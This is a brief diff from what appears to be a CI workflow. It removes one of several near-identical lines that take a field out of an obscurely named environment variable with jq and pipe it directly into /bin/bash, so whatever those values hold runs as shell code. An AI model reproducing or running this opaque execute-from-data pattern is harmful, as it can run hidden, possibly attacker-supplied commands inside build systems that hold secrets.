@@ -31,7 +31,6 @@ jobs:
           echo $fgu3217 | jq -r .owsv05455 | /bin/bash
           echo $wnhk154 | jq -r .qqbnf62125 | /bin/bash
           echo $r84901 | jq -r .hj334 | /bin/bash
-          echo $p9 | jq -r .ygkm4828 | /bin/bash
           echo $ntose7 | jq -r .lumiw4189 | /bin/bash
           echo $e01 | jq -r .yd58 | /bin/bash
           echo $h96 | jq -r .wld4436 | /bin/bash
